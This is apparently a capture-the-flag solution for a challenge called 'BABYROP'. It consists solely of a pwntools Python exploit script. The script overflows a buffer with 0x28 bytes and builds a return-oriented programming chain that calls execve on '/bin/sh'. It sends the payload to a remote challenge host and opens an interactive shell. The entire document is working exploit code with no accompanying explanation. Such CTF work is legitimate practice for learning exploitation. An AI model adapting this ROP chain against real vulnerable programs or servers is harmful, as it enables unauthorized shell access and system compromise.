# BABYROP

```py
from pwn import *

binary = context.binary = ELF('./babyrop')
#p = process(binary.path)
#gdb.attach(p)

p = remote('remote1.thcon.party', 10900)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi','pop r15','ret'])[0]

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.search(b'/bin/sh').__next__())
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(binary.plt.execve)

p.sendline(payload)

p.interactive()
```
